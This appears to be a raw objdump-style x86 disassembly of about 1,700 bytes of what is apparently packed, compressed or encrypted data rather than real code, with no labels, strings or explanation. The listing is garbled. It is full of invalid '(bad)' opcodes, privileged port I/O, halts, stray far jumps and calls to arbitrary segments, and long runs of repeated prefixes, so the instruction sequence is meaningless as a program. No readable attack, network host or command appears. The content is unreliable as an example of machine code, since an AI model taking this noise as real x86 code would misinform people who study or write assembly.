  402bd4:	65 c7                	gs (bad)
  402bd6:	68 bf 72 75 bc       	push   $0xbc7572bf
  402bdb:	c3                   	ret
  402bdc:	67 57                	addr16 push %edi
  402bde:	48                   	dec    %eax
  402bdf:	98                   	cwtl
  402be0:	50                   	push   %eax
  402be1:	98                   	cwtl
  402be2:	4c                   	dec    %esp
  402be3:	e5 4f                	in     $0x4f,%eax
  402be5:	93                   	xchg   %eax,%ebx
  402be6:	58                   	pop    %eax
  402be7:	0c 00                	or     $0x0,%al
  402be9:	00 80 17 16 ad b3    	add    %al,-0x4c52e9e9(%eax)
  402bef:	e0 88                	loopne 0x402b79
  402bf1:	ba b7 4e a6 0d       	mov    $0xda64eb7,%edx
  402bf6:	0f 2c f0             	cvttps2pi %xmm0,%mm6
  402bf9:	50                   	push   %eax
  402bfa:	05 0e 98 ed 63       	add    $0x63ed980e,%eax
  402bff:	3b 11                	cmp    (%ecx),%edx
  402c01:	90                   	nop
  402c02:	df 16                	fists  (%esi)
  402c04:	22 00                	and    (%eax),%al
  402c06:	04 43                	add    $0x43,%al
  402c08:	81 21 27 a6 08 2d    	andl   $0x2d08a627,(%ecx)
  402c0e:	1b 74 3c 0d          	sbb    0xd(%esp,%edi,1),%esi
  402c12:	00 c0                	add    %al,%al
  402c14:	d2 82 48 b5 8e 02    	rolb   %cl,0x28eb548(%edx)
  402c1a:	e5 45                	in     $0x45,%eax
  402c1c:	90                   	nop
  402c1d:	65 8e b6 6a 87 a4 5d 	mov    %gs:0x5da4876a(%esi),%?
  402c24:	b4 a5                	mov    $0xa5,%ah
  402c26:	9b                   	fwait
  402c27:	72 4d                	jb     0x402c76
  402c29:	91                   	xchg   %eax,%ecx
  402c2a:	dc 65 b5             	fsubl  -0x4b(%ebp)
  402c2d:	3c 18                	cmp    $0x18,%al
  402c2f:	4e                   	dec    %esi
  402c30:	d3 92 44 9c 9b 57    	rcll   %cl,0x579b9c44(%edx)
  402c36:	f3 4c                	repz dec %esp
  402c38:	e7 9e                	out    %eax,$0x9e
  402c3a:	57                   	push   %edi
  402c3b:	7a 03                	jp     0x402c40
  402c3d:	bf d5 b0 be 30       	mov    $0x30beb0d5,%edi
  402c42:	33 88 01 d3 4a 14    	xor    0x144ad301(%eax),%ecx
  402c48:	0f 14 12             	unpcklps (%edx),%xmm2
  402c4b:	2c 3a                	sub    $0x3a,%al
  402c4d:	f4                   	hlt
  402c4e:	20 84 74 52 a7 aa cb 	and    %al,-0x345558ae(%esp,%esi,2)
  402c55:	e6 a5                	out    %al,$0xa5
  402c57:	f7 7a 79             	idivl  0x79(%edx)
  402c5a:	4d                   	dec    %ebp
  402c5b:	32 59 a0             	xor    -0x60(%ecx),%bl
  402c5e:	b0 2c                	mov    $0x2c,%al
  402c60:	8f                   	(bad)
  402c61:	e5 b3                	in     $0xb3,%eax
  402c63:	b4 c4                	mov    $0xc4,%ah
  402c65:	e2 df                	loop   0x402c46
  402c67:	05 f9 23 22 df       	add    $0xdf2223f9,%eax
  402c6c:	09 fa                	or     %edi,%edx
  402c6e:	cf                   	iret
  402c6f:	e0 fc                	loopne 0x402c6d
  402c71:	8f 28 8c 97          	(bad)
  402c75:	35 4a 22 29 6d       	xor    $0x6d29224a,%eax
  402c7a:	8c a6 25 53 62 4a    	mov    %fs,0x4a625325(%esi)
  402c80:	b3 a4                	mov    $0xa4,%bl
  402c82:	63 c6                	arpl   %eax,%esi
  402c84:	4e                   	dec    %esi
  402c85:	85 75 74             	test   %esi,0x74(%ebp)
  402c88:	f8                   	clc
  402c89:	33 6d 5e             	xor    0x5e(%ebp),%ebp
  402c8c:	6e                   	outsb  %ds:(%esi),(%dx)
  402c8d:	d4 77                	aam    $0x77
  402c8f:	f4                   	hlt
  402c90:	32 44 54 5c          	xor    0x5c(%esp,%edx,2),%al
  402c94:	30 d7                	xor    %dl,%bh
  402c96:	37                   	aaa
  402c97:	0c e4                	or     $0xe4,%al
  402c99:	58                   	pop    %eax
  402c9a:	ef                   	out    %eax,(%dx)
  402c9b:	86 26                	xchg   %ah,(%esi)
  402c9d:	62 8f 0f 3d 43 1c    	bound  %ecx,0x1c433d0f(%edi)
  402ca3:	59                   	pop    %ecx
  402ca4:	60                   	pusha
  402ca5:	35 4c b8 a3 68       	xor    $0x68a3b84c,%eax
  402caa:	28 59 57             	sub    %bl,0x57(%ecx)
  402cad:	19 be ca 48 c3 b2    	sbb    %edi,-0x4d3cb736(%esi)
  402cb3:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402cb6:	d1 e7                	shl    $1,%edi
  402cb8:	67 60                	addr16 pusha
  402cba:	6c                   	insb   (%dx),%es:(%edi)
  402cbb:	74 f2                	je     0x402caf
  402cbd:	69 9e 7f 6c 11 54 93 	imul   $0x25aa5393,0x54116c7f(%esi),%ebx
  402cc4:	53 aa 25 
  402cc7:	6d                   	insl   (%dx),%es:(%edi)
  402cc8:	cb                   	lret
  402cc9:	b2 3a                	mov    $0x3a,%dl
  402ccb:	32 dc                	xor    %ah,%bl
  402ccd:	d1 e7                	shl    $1,%edi
  402ccf:	67 a4                	movsb  %ds:(%si),%es:(%di)
  402cd1:	78 80                	js     0x402c53
  402cd3:	54                   	push   %esp
  402cd4:	0c 94                	or     $0x94,%al
  402cd6:	7f b8                	jg     0x402c90
  402cd8:	18 6e be             	sbb    %ch,-0x42(%esi)
  402cdb:	7c 5d                	jl     0x402d3a
  402cdd:	03 03                	add    (%ebx),%eax
  402cdf:	6b 0a f0             	imul   $0xfffffff0,(%edx),%ecx
  402ce2:	18 08                	sbb    %cl,(%eax)
  402ce4:	56                   	push   %esi
  402ce5:	42                   	inc    %edx
  402ce6:	41                   	inc    %ecx
  402ce7:	36 2e 44             	ss cs inc %esp
  402cea:	4c                   	dec    %esp
  402ceb:	47                   	inc    %edi
  402cec:	d5 bf                	aad    $0xbf
  402cee:	19 2a                	sbb    %ebp,(%edx)
  402cf0:	1f                   	pop    %ds
  402cf1:	57                   	push   %edi
  402cf2:	39 34 3e             	cmp    %esi,(%esi,%edi,1)
  402cf5:	a9 59 cb 42 a2       	test   $0xa242cb59,%eax
  402cfa:	86 95 51 4b 54 e5    	xchg   %dl,-0x1aabb4af(%ebp)
  402d00:	b6 a2                	mov    $0xa2,%dh
  402d02:	cf                   	iret
  402d03:	0a be 55 76 0c 48    	or     0x480c7655(%esi),%bh
  402d09:	cb                   	lret
  402d0a:	d7                   	xlat   %ds:(%ebx)
  402d0b:	65 7b 54             	gs jnp 0x402d62
  402d0e:	43                   	inc    %ebx
  402d0f:	f5                   	cmc
  402d10:	94                   	xchg   %eax,%esp
  402d11:	4b                   	dec    %ebx
  402d12:	26 52                	es push %edx
  402d14:	e8 e7 b2 ac 41       	call   0x41ece000
  402d19:	54                   	push   %esp
  402d1a:	fb                   	sti
  402d1b:	b9 1c 46 44 16       	mov    $0x1644461c,%ecx
  402d20:	d9 60 ea             	fldenv -0x16(%eax)
  402d23:	4d                   	dec    %ebp
  402d24:	65 59                	gs pop %ecx
  402d26:	e7 89                	out    %eax,$0x89
  402d28:	44                   	inc    %esp
  402d29:	e3 b8                	jecxz  0x402ce3
  402d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  402d2c:	cb                   	lret
  402d2d:	4c                   	dec    %esp
  402d2e:	57                   	push   %edi
  402d2f:	fa                   	cli
  402d30:	97                   	xchg   %eax,%edi
  402d31:	d2 11                	rclb   %cl,(%ecx)
  402d33:	b7 e9                	mov    $0xe9,%bh
  402d35:	3d 8b 52 79 e7       	cmp    $0xe779528b,%eax
  402d3a:	2d 8b 31 32 33       	sub    $0x3332318b,%eax
  402d3f:	9d                   	popf
  402d40:	93                   	xchg   %eax,%ebx
  402d41:	77 de                	ja     0x402d21
  402d43:	38 39                	cmp    %bh,(%ecx)
  402d45:	b7 2c                	mov    $0x2c,%bh
  402d47:	da 6f 30             	fisubrl 0x30(%edi)
  402d4a:	0f 9a e7             	setp   %bh
  402d4d:	9d                   	popf
  402d4e:	31 32                	xor    %esi,(%edx)
  402d50:	02 f3                	add    %bl,%dh
  402d52:	a3 e3 bc 2a 2b       	mov    %eax,0x2b2abce3
  402d57:	f3 f3 f3 f3 2d 2e 2f 	repz repz repz repz sub $0xf33b2f2e,%eax
  402d5e:	3b f3 
  402d60:	f3 f3 f3 3d 2c 60 5b 	repz repz repz cmp $0xf35b602c,%eax
  402d67:	f3 
  402d68:	f3 f3 f3 5c          	repz repz repz pop %esp
  402d6c:	27                   	daa
  402d6d:	30 31                	xor    %dh,(%ecx)
  402d6f:	f3 f3 f3 f3 32 33    	repz repz repz repz xor (%ebx),%dh
  402d75:	34 35                	xor    $0x35,%al
  402d77:	f3 f3 f3 f3 36 37    	repz repz repz repz ss aaa
  402d7d:	38 39                	cmp    %bh,(%ecx)
  402d7f:	ad                   	lods   %ds:(%esi),%eax
  402d80:	fe                   	(bad)
  402d81:	33 cc                	xor    %esp,%ecx
  402d83:	79 94                	jns    0x402d19
  402d85:	35 0b f1 75 64       	xor    $0x6475f10b,%eax
  402d8a:	89 4d 22             	mov    %ecx,0x22(%ebp)
  402d8d:	5f                   	pop    %edi
  402d8e:	61                   	popa
  402d8f:	68 9b c5 e7 48       	push   $0x48e7c59b
  402d94:	74 2c                	je     0x402dc2
  402d96:	ea 97 30 73 6d 98 ca 	ljmp   $0xca98,$0x6d733097
  402d9d:	61                   	popa
  402d9e:	99                   	cltd
  402d9f:	6e                   	outsb  %ds:(%esi),(%dx)
  402da0:	67 10 85 63 eb       	adc    %al,-0x149d(%di)
  402da5:	72 71                	jb     0x402e18
  402da7:	d4 b4                	aam    $0xb4
  402da9:	8d 8f b7 09 b2 72    	lea    0x72b209b7(%edi),%ecx
  402daf:	1c 72                	sbb    $0x72,%al
  402db1:	d1 d3                	rcl    $1,%ebx
  402db3:	42                   	inc    %edx
  402db4:	20 4b 16             	and    %cl,0x16(%ebx)
  402db7:	35 b7 6f d7 42       	xor    $0x42d76fb7,%eax
  402dbc:	d4 78                	aam    $0x78
  402dbe:	66 b6 d8             	data16 mov $0xd8,%dh
  402dc1:	65 79 20             	gs jns 0x402de4
  402dc4:	46                   	inc    %esi
  402dc5:	69 39 f1 6f 8b 86    	imul   $0x868b6ff1,(%ecx),%edi
  402dcb:	69 3b 63 82 bc 96    	imul   $0x96bc8263,(%ebx),%edi
  402dd1:	3d 66 67 5b e3       	cmp    $0xe35b6766,%eax
  402dd6:	a2 77 61 7e 93       	mov    %al,0x937e6177
  402ddb:	fd                   	std
  402ddc:	03 63 9c             	add    -0x64(%ebx),%esp
  402ddf:	7a cd                	jp     0x402dae
  402de1:	62 64 97 f3          	bound  %esp,-0xd(%edi,%edx,4)
  402de5:	88 69 72             	mov    %ch,0x72(%ecx)
  402de8:	36 f9                	ss stc
  402dea:	b8 6c 73 73 b2       	mov    $0xb273736c,%eax
  402def:	2f                   	das
  402df0:	9a 69 77 f9 df e6 fd 	lcall  $0xfde6,$0xdff97769
  402df7:	10 33                	adc    %dh,(%ebx)
  402df9:	37                   	aaa
  402dfa:	79 3e                	jns    0x402e3a
  402dfc:	4d                   	dec    %ebp
  402dfd:	0e                   	push   %cs
  402dfe:	75 cd                	jne    0x402dcd
  402e00:	c8 61 d9 6c          	enter  $0xd961,$0x6c
  402e04:	74 7f                	je     0x402e85
  402e06:	e4 e7                	in     $0xe7,%al
  402e08:	66 0c 72             	data16 or $0x72,%al
  402e0b:	24 59                	and    $0x59,%al
  402e0d:	e7 b2                	out    %eax,$0xb2
  402e0f:	74 6e                	je     0x402e7f
  402e11:	d7                   	xlat   %ds:(%ebx)
  402e12:	ab                   	stos   %eax,%es:(%edi)
  402e13:	c5 db 74             	(bad)
  402e16:	db 3b                	fstpt  (%ebx)
  402e18:	51                   	push   %ecx
  402e19:	ba 3b 51 ee 09       	mov    $0x9ee513b,%edx
  402e1e:	e1 2d                	loope  0x402e4d
  402e20:	19 f1                	sbb    %esi,%ecx
  402e22:	69 f9 64 5b 49 cd    	imul   $0xcd495b64,%ecx,%edi
  402e28:	d6                   	salc
  402e29:	b0 d9                	mov    $0xd9,%al
  402e2b:	00 b5 e8 98 5c 63    	add    %dh,0x635c98e8(%ebp)
  402e31:	27                   	daa
  402e32:	97                   	xchg   %eax,%edi
  402e33:	e5 d9                	in     $0xd9,%eax
  402e35:	0c 6d                	or     $0x6d,%al
  402e37:	61                   	popa
  402e38:	79 be                	jns    0x402df8
  402e3a:	ce                   	into
  402e3b:	ac                   	lods   %ds:(%esi),%al
  402e3c:	65 0a 61 b2          	or     %gs:-0x4e(%ecx),%ah
  402e40:	66 b2 1a             	data16 mov $0x1a,%dl
  402e43:	61                   	popa
  402e44:	00 26                	add    %ah,(%esi)
  402e46:	45                   	inc    %ebp
  402e47:	eb cf                	jmp    0x402e18
  402e49:	8f                   	(bad)
  402e4a:	78 59                	js     0x402ea5
  402e4c:	aa                   	stos   %al,%es:(%edi)
  402e4d:	66 5d                	pop    %bp
  402e4f:	2b 47 36             	sub    0x36(%edi),%eax
  402e52:	65 3c 77             	gs cmp $0x77,%al
  402e55:	ae                   	scas   %es:(%edi),%al
  402e56:	b6 79                	mov    $0x79,%dh
  402e58:	7e 0e                	jle    0x402e68
  402e5a:	22 70 0e             	and    0xe(%eax),%dh
  402e5d:	77 b2                	ja     0x402e11
  402e5f:	76 59                	jbe    0x402eba
  402e61:	b5 63                	mov    $0x63,%ch
  402e63:	6c                   	insb   (%dx),%es:(%edi)
  402e64:	e9 65 f4 77 e8       	jmp    0xe8b822ce
  402e69:	3b 51 e7             	cmp    -0x19(%ecx),%edx
  402e6c:	73 9f                	jae    0x402e0d
  402e6e:	27                   	daa
  402e6f:	a3 85 30 35 49       	mov    %eax,0x49353085
  402e74:	bb 36 2a 53 e6       	mov    $0xe6532a36,%ebx
  402e79:	b5 66                	mov    $0x66,%ch
  402e7b:	75 70                	jne    0x402eed
  402e7d:	65 cf                	gs iret
  402e7f:	10 85 67 6d 91 9f    	adc    %al,-0x606e9299(%ebp)
  402e85:	23 c3                	and    %ebx,%eax
  402e87:	5c                   	pop    %esp
  402e88:	72 95                	jb     0x402e1f
  402e8a:	f7 b5 fe cf 7d 5a    	divl   0x5a7dcffe(%ebp)
  402e90:	fb                   	sti
  402e91:	41                   	inc    %ecx
  402e92:	59                   	pop    %ecx
  402e93:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402e94:	cc                   	int3
  402e95:	cb                   	lret
  402e96:	63 a3 87 70 66 e7    	arpl   %esp,-0x18998f79(%ebx)
  402e9c:	66 e8 3d 74          	callw  0xa2dd
  402ea0:	9d                   	popf
  402ea1:	34 01                	xor    $0x1,%al
  402ea3:	d6                   	salc
  402ea4:	c9                   	leave
  402ea5:	b0 4d                	mov    $0x4d,%al
  402ea7:	ff                   	(bad)
  402ea8:	ff 88 9e d3 e1 53    	decl   0x53e1d39e(%eax)
  402eae:	01 44 cf 29          	add    %eax,0x29(%edi,%ecx,8)
  402eb2:	ce                   	into
  402eb3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402eb4:	65 93                	gs xchg %eax,%ebx
  402eb6:	11 f7                	adc    %esi,%edi
  402eb8:	dc 54 8a b5          	fcoml  -0x4b(%edx,%ecx,4)
  402ebc:	d5 33                	aad    $0x33
  402ebe:	70 cd                	jo     0x402e8d
  402ec0:	79 9a                	jns    0x402e5c
  402ec2:	e4 51                	in     $0x51,%al
  402ec4:	71 5b                	jno    0x402f21
  402ec6:	16                   	push   %ss
  402ec7:	3a 53 c5             	cmp    -0x3b(%ebx),%dl
  402eca:	9a bd ad 56 0b b5 6e 	lcall  $0x6eb5,$0xb56adbd
  402ed1:	64 75 6a             	fs jne 0x402f3e
  402ed4:	bf 63 ce 6e b8       	mov    $0xb86ece63,%edi
  402ed9:	6f                   	outsl  %ds:(%esi),(%dx)
  402eda:	ca f1 2e             	lret   $0x2ef1
  402edd:	1e                   	push   %ds
  402ede:	99                   	cltd
  402edf:	ff f2                	push   %edx
  402ee1:	4d                   	dec    %ebp
  402ee2:	20 59 1c             	and    %bl,0x1c(%ecx)
  402ee5:	4d                   	dec    %ebp
  402ee6:	a9 64 17 93 e7       	test   $0xe7931764,%eax
  402eeb:	b2 44                	mov    $0x44,%dl
  402eed:	63 f3                	arpl   %esi,%ebx
  402eef:	2d 59 b0 c7 68       	sub    $0x68c7b059,%eax
  402ef4:	19 73 52             	sbb    %esi,0x52(%ebx)
  402ef7:	a3 3a 2c 0b 79       	mov    %eax,0x790b2c3a
  402efc:	c8 8e 97 c4          	enter  $0x978e,$0xc4
  402f00:	00 e8                	add    %ch,%al
  402f02:	ff                   	lcall  (bad)
  402f03:	db 39                	fstpt  (%ecx)
  402f05:	24 25                	and    $0x25,%al
  402f07:	e2 71                	loop   0x402f7a
  402f09:	a1 6f 8d 9e e5       	mov    0xe59e8d6f,%eax
  402f0e:	c2 70 b5             	ret    $0xb570
  402f11:	97                   	xchg   %eax,%edi
  402f12:	c9                   	leave
  402f13:	ce                   	into
  402f14:	74 72                	je     0x402f88
  402f16:	b1 9e                	mov    $0x9e,%cl
  402f18:	d6                   	salc
  402f19:	69 ef 7e 8f b2 75    	imul   $0x75b28f7e,%edi,%ebp
  402f1f:	e5 73                	in     $0x73,%eax
  402f21:	a1 e8 12 ca 65       	mov    0x65ca12e8,%eax
  402f26:	e7 73                	out    %eax,$0x73
  402f28:	b5 66                	mov    $0x66,%ch
  402f2a:	d1 33                	shll   $1,(%ebx)
  402f2c:	54                   	push   %esp
  402f2d:	b9 6c 52 bb 6f       	mov    $0x6fbb526c,%ecx
  402f32:	1f                   	pop    %ds
  402f33:	d1 fb                	sar    $1,%ebx
  402f35:	28 7b ef             	sub    %bh,-0x11(%ebx)
  402f38:	9b d8 2e             	fsubrs (%esi)
  402f3b:	1a 86 f4 42 da 89    	sbb    -0x7625bd0c(%esi),%al
  402f41:	65 7a 6b             	gs jp  0x402faf
  402f44:	97                   	xchg   %eax,%edi
  402f45:	88 6e d6             	mov    %ch,-0x2a(%esi)
  402f48:	28 6c e7 8a          	sub    %ch,-0x76(%edi,%eiz,8)
  402f4c:	ba 76 b2 bf a7       	mov    $0xa7bfb276,%edx
  402f51:	fb                   	sti
  402f52:	24 7d                	and    $0x7d,%al
  402f54:	af                   	scas   %es:(%edi),%eax
  402f55:	d5 35                	aad    $0x35
  402f57:	2f                   	das
  402f58:	da 39                	fidivrl (%ecx)
  402f5a:	c4 14 6b             	les    (%ebx,%ebp,2),%edx
  402f5d:	19 05 3f 5f 00 7b    	sbb    %eax,0x7b005f3f
  402f63:	34 f2                	xor    $0xf2,%al
  402f65:	b2 35                	mov    $0x35,%dl
  402f67:	7d 1e                	jge    0x402f87
  402f69:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402f6a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402f6b:	63 db                	arpl   %ebx,%ebx
  402f6d:	97                   	xchg   %eax,%edi
  402f6e:	5f                   	pop    %edi
  402f6f:	be 59 12 97 9e       	mov    $0x9e971259,%esi
  402f74:	45                   	inc    %ebp
  402f75:	1b 51 7b             	sbb    0x7b(%ecx),%edx
  402f78:	d7                   	xlat   %ds:(%ebx)
  402f79:	fd                   	std
  402f7a:	cd 82                	int    $0x82
  402f7c:	cd da                	int    $0xda
  402f7e:	69 6f 79 9c f6 df 77 	imul   $0x77dff69c,0x79(%edi),%ebp
  402f85:	9a b8 16 3d b4 dd 53 	lcall  $0x53dd,$0xb43d16b8
  402f8c:	04 2f                	add    $0x2f,%al
  402f8e:	3b 87 a2 73 51 44    	cmp    0x445173a2(%edi),%eax
  402f94:	73 8a                	jae    0x402f20
  402f96:	46                   	inc    %esi
  402f97:	4c                   	dec    %esp
  402f98:	b2 66                	mov    $0x66,%dl
  402f9a:	92                   	xchg   %eax,%edx
  402f9b:	f1                   	int1
  402f9c:	75 68                	jne    0x403006
  402f9e:	6e                   	outsb  %ds:(%esi),(%dx)
  402f9f:	9c                   	pushf
  402fa0:	da fb                	(bad)
  402fa2:	a3 31 d7 63 5e       	mov    %eax,0x5e63d731
  402fa7:	fc                   	cld
  402fa8:	e3 94                	jecxz  0x402f3e
  402faa:	2a 59 b9             	sub    -0x47(%ecx),%bl
  402fad:	6a 6b                	push   $0x6b
  402faf:	77 a2                	ja     0x402f53
  402fb1:	72 ed                	jb     0x402fa0
  402fb3:	1e                   	push   %ds
  402fb4:	50                   	push   %eax
  402fb5:	9f                   	lahf
  402fb6:	46                   	inc    %esi
  402fb7:	96                   	xchg   %eax,%esi
  402fb8:	2e 63 34 0e          	arpl   %esi,%cs:(%esi,%ecx,1)
  402fbc:	22 cf                	and    %bh,%cl
  402fbe:	14 55                	adc    $0x55,%al
  402fc0:	ff 64 31 d0          	jmp    *-0x30(%ecx,%esi,1)
  402fc4:	45                   	inc    %ebp
  402fc5:	a2 72 da d9 3c       	mov    %al,0x3cd9da72
  402fca:	72 28                	jb     0x402ff4
  402fcc:	86 db                	xchg   %bl,%bl
  402fce:	35 66 e8 3a 57       	xor    $0x573ae866,%eax
  402fd3:	0d 65 6b d1 bf       	or     $0xbfd16b65,%eax
  402fd8:	d9 8d d1 3c e4 64    	(bad) 0x64e43cd1(%ebp)
  402fde:	2f                   	das
  402fdf:	5f                   	pop    %edi
  402fe0:	57                   	push   %edi
  402fe1:	de 00                	fiadds (%eax)
  402fe3:	47                   	inc    %edi
  402fe4:	4c                   	dec    %esp
  402fe5:	94                   	xchg   %eax,%esp
  402fe6:	4f                   	dec    %edi
  402fe7:	5b                   	pop    %ebx
  402fe8:	6c                   	insb   (%dx),%es:(%edi)
  402fe9:	f9                   	stc
  402fea:	f2 5b                	repnz pop %ebx
  402fec:	36 41                	ss inc %ecx
  402fee:	64 b4 fa             	fs mov $0xfa,%ah
  402ff1:	26 d9 30             	fnstenv %es:(%eax)
  402ff4:	f6 4d e3 61          	testb  $0x61,-0x1d(%ebp)
  402ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff9:	c6                   	(bad)
  402ffa:	51                   	push   %ecx
  402ffb:	c3                   	ret
  402ffc:	89 79 a3             	mov    %edi,-0x5d(%ecx)
  402fff:	df f5                	fcomip %st(5),%st
  403001:	2c cd                	sub    $0xcd,%al
  403003:	ce                   	into
  403004:	31 bf 43 6d 96 f2    	xor    %edi,-0xd6992bd(%edi)
  40300a:	5b                   	pop    %ebx
  40300b:	31 97 ef 69 ae 70    	xor    %edx,0x70ae69ef(%edi)
  403011:	fb                   	sti
  403012:	df 5d 69             	fistps 0x69(%ebp)
  403015:	c7                   	(bad)
  403016:	db f9                	(bad)
  403018:	70 eb                	jo     0x403005
  40301a:	e4 7d                	in     $0x7d,%al
  40301c:	03 20                	add    (%eax),%esp
  40301e:	24 af                	and    $0xaf,%al
  403020:	5f                   	pop    %edi
  403021:	7e 30                	jle    0x403053
  403023:	00 72 12             	add    %dh,0x12(%edx)
  403026:	35 0d 68 95 a7       	xor    $0xa795680d,%eax
  40302b:	75 f4                	jne    0x403021
  40302d:	91                   	xchg   %eax,%ecx
  40302e:	d5 b1                	aad    $0xb1
  403030:	14 4d                	adc    $0x4d,%al
  403032:	06                   	push   %es
  403033:	b7 81                	mov    $0x81,%bh
  403035:	f9                   	stc
  403036:	3e 78 d3             	js,pt  0x40300c
  403039:	60                   	pusha
  40303a:	14 9f                	adc    $0x9f,%al
  40303c:	74 2d                	je     0x40306b
  40303e:	f1                   	int1
  40303f:	38 e9                	cmp    %ch,%cl
  403041:	6e                   	outsb  %ds:(%esi),(%dx)
  403042:	ec                   	in     (%dx),%al
  403043:	61                   	popa
  403044:	98                   	cwtl
  403045:	35 70 00 e8 59       	xor    $0x59e80070,%eax
  40304a:	db d6                	fcmovnbe %st(6),%st
  40304c:	69 ff 6c bf ab 3c    	imul   $0x3cabbf6c,%edi,%edi
  403052:	27                   	daa
  403053:	cb                   	lret
  403054:	c5 76 6c             	lds    0x6c(%esi),%esi
  403057:	61                   	popa
  403058:	96                   	xchg   %eax,%esi
  403059:	e6 f5                	out    %al,$0xf5
  40305b:	fc                   	cld
  40305c:	0c f5                	or     $0xf5,%al
  40305e:	77 32                	ja     0x403092
  403060:	ea 69 d1 34 92 c6 64 	ljmp   $0x64c6,$0x9234d169
  403067:	4d                   	dec    %ebp
  403068:	e4 ad                	in     $0xad,%al
  40306a:	93                   	xchg   %eax,%ebx
  40306b:	67 e3 fe             	jcxz   0x40306c
  40306e:	85 de                	test   %ebx,%esi
  403070:	68 56 0f 59 3d       	push   $0x3d590f56
  403075:	61                   	popa
  403076:	55                   	push   %ebp
  403077:	53                   	push   %ebx
  403078:	ea 98 d9 4c 34 2b 62 	ljmp   $0x622b,$0x344cd998
  40307f:	79 6a                	jns    0x4030eb
  403081:	46                   	inc    %esi
  403082:	fb                   	sti
  403083:	ba af c9 3b 26       	mov    $0x263bc9af,%edx
  403088:	70 66                	jo     0x4030f0
  40308a:	ff 16                	call   *(%esi)
  40308c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40308d:	6b 73 3a d9          	imul   $0xffffffd9,0x3a(%ebx),%esi
  403091:	cf                   	iret
  403092:	3b 74 08 b3          	cmp    -0x4d(%eax,%ecx,1),%esi
  403096:	7e 4e                	jle    0x4030e6
  403098:	d4 0c                	aam    $0xc
  40309a:	73 ad                	jae    0x403049
  40309c:	6b 46 77 61          	imul   $0x61,0x77(%esi),%eax
  4030a0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4030a1:	6a a4                	push   $0xffffffa4
  4030a3:	67 a3 6f a4          	addr16 mov %eax,0xa46f
  4030a7:	64 22 ae 26 ad 69 13 	and    %fs:0x1369ad26(%esi),%ch
  4030ae:	4d                   	dec    %ebp
  4030af:	f7 60 62             	mull   0x62(%eax)
  4030b2:	c5 a2 fd 1e 6a 1b    	lds    0x1b6a1efd(%edx),%esp
  4030b8:	f2 6f                	repnz outsl %ds:(%esi),(%dx)
  4030ba:	90                   	nop
  4030bb:	62 70 3c             	bound  %esi,0x3c(%eax)
  4030be:	52                   	push   %edx
  4030bf:	bb fd ae ac 63       	mov    $0x63acaefd,%ebx
  4030c4:	69 0c d6 89 e0 3e 6b 	imul   $0x6b3ee089,(%esi,%edx,8),%ecx
  4030cb:	fa                   	cli
  4030cc:	b8 d4 b3 0c b7       	mov    $0xb70cb3d4,%eax
  4030d1:	86 6d b7             	xchg   %ch,-0x49(%ebp)
  4030d4:	9d                   	popf
  4030d5:	ef                   	out    %eax,(%dx)
  4030d6:	13 2d 6b 1a 56 f2    	adc    0xf2561a6b,%ebp
  4030dc:	76 95                	jbe    0x403073
  4030de:	69 70 e6 e9 28 7a 73 	imul   $0x737a28e9,-0x1a(%eax),%esi
  4030e5:	64 67 9a db 07 9d 13 	fs addr16 lcall $0xe73f,$0x139d07db
  4030ec:	3f e7 
  4030ee:	62 34 ae             	bound  %esi,(%esi,%ebp,4)
  4030f1:	9d                   	popf
  4030f2:	9b                   	fwait
  4030f3:	62 28                	bound  %ebp,(%eax)
  4030f5:	1e                   	push   %ds
  4030f6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4030f7:	fa                   	cli
  4030f8:	6c                   	insb   (%dx),%es:(%edi)
  4030f9:	e8 59 6f 9c 65       	call   0x65dca057
  4030fe:	59                   	pop    %ecx
  4030ff:	c9                   	leave
  403100:	f5                   	cmc
  403101:	90                   	nop
  403102:	19 bd 1a 66 37 35    	sbb    %edi,0x3537661a(%ebp)
  403108:	4f                   	dec    %edi
  403109:	b9 d5 f9 5d 1a       	mov    $0x1a5df9d5,%ecx
  40310e:	59                   	pop    %ecx
  40310f:	e6 1d                	out    %al,$0x1d
  403111:	ab                   	stos   %eax,%es:(%edi)
  403112:	6c                   	insb   (%dx),%es:(%edi)
  403113:	68 d3 a8 bd 2a       	push   $0x2abda8d3
  403118:	06                   	push   %es
  403119:	c4                   	(bad)
  40311a:	df 20                	fbld   (%eax)
  40311c:	62 3d c5 53 20 56    	bound  %edi,0x562053c5
  403122:	bb f2 7b 20 2d       	mov    $0x2d207bf2,%ebx
  403127:	ea 99 6a 20 5f 59 3d 	ljmp   $0x3d59,$0x5f206a99
  40312e:	90                   	nop
  40312f:	b5 6d                	mov    $0x6d,%ch
  403131:	66 64 d3 f2          	fs shl %cl,%dx
  403135:	6d                   	insl   (%dx),%es:(%edi)
  403136:	12 62 99             	adc    -0x67(%edx),%ah
  403139:	86 b5 74 f2 61 8c    	xchg   %dh,-0x739e0d8c(%ebp)
  40313f:	ca 20 20             	lret   $0x2020
  403142:	4d                   	dec    %ebp
  403143:	9f                   	lahf
  403144:	b7 74                	mov    $0x74,%bh
  403146:	0b a7 78 1e 72 b2    	or     -0x4d8de188(%edi),%esp
  40314c:	cd 7a                	int    $0x7a
  40314e:	27                   	daa
  40314f:	65 2d fe 8d f2 d1    	gs sub $0xd1f28dfe,%eax
  403155:	2d cd 40 6c b7       	sub    $0xb76c40cd,%eax
  40315a:	73 e9                	jae    0x403145
  40315c:	59                   	pop    %ecx
  40315d:	3e ef                	ds out %eax,(%dx)
  40315f:	9b                   	fwait
  403160:	28 8b a9 78 ec 8e    	sub    %cl,-0x71138757(%ebx)
  403166:	c5 f8 2c             	(bad)
  403169:	20 3d 99 7d 83 64    	and    %bh,0x64837d99
  40316f:	04 9b                	add    $0x9b,%al
  403171:	ad                   	lods   %ds:(%esi),%eax
  403172:	5a                   	pop    %edx
  403173:	3b 51 5c             	cmp    0x5c(%ecx),%edx
  403176:	37                   	aaa
  403177:	00 ec                	add    %ch,%ah
  403179:	70 c2                	jo     0x40313d
  40317b:	d4 53                	aam    $0x53
  40317d:	b7 a7                	mov    $0xa7,%bh
  40317f:	e5 bf                	in     $0xbf,%eax
